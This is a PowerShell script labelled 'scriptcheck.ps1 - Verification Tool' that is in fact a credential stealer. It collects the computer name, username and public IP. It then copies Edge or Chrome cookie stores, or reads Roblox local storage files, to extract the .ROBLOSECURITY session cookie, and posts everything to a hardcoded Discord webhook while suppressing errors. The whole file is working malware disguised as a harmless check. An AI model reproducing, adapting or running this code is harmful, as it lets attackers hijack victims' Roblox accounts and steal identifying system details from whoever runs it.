# scriptcheck.ps1 - Verification Tool
$w = 'https://discord.com/api/webhooks/1537750275459121254/tii30i26ayBfg5HooY0xU6QRJflrTzeppVmbIBwz7FCZre3hV4j8TleoytkJsUoX4PLY'

# Get system info
$ip = (Invoke-WebRequest -Uri 'http://api.ipify.org' -UseBasicParsing).Content
$sys = "PC: $env:COMPUTERNAME`nUser: $env:USERNAME`nIP: $ip"

# Try Edge cookies
$p = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
$rb = ''
if (Test-Path $p) {
    $tmp = "$env:TEMP\cook.txt"
    Copy-Item $p $tmp -ErrorAction SilentlyContinue
    if (Test-Path $tmp) {
        $c = Get-Content $tmp -ErrorAction SilentlyContinue
        if ($c -match '\.ROBLOSECURITY=([^;]+)') {
            $rb = $matches[1]
        }
        Remove-Item $tmp -ErrorAction SilentlyContinue
    }
}

# Try Chrome
if ($rb -eq '') {
    $p = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
    if (Test-Path $p) {
        $tmp = "$env:TEMP\cook.txt"
        Copy-Item $p $tmp -ErrorAction SilentlyContinue
        if (Test-Path $tmp) {
            $c = Get-Content $tmp -ErrorAction SilentlyContinue
            if ($c -match '\.ROBLOSECURITY=([^;]+)') {
                $rb = $matches[1]
            }
            Remove-Item $tmp -ErrorAction SilentlyContinue
        }
    }
}

# Try Roblox app
if ($rb -eq '') {
    $paths = @("$env:APPDATA\Roblox\Local Storage\leveldb\*.log", "$env:APPDATA\Roblox\Local Storage\leveldb\*.ldb")
    foreach ($p in $paths) {
        if (Test-Path $p) {
            $c = Get-Content $p -ErrorAction SilentlyContinue
            if ($c -match '\.ROBLOSECURITY=([^;]+)') {
                $rb = $matches[1]
                break
            }
        }
    }
}

$msg = "✅ **ScriptCheck Result**`n$sys`n`n🎮 **Roblox Cookie:**`n```$rb```"
$body = @{ content = $msg } | ConvertTo-Json
Invoke-RestMethod -Uri $w -Method Post -Body $body -ContentType 'application/json'
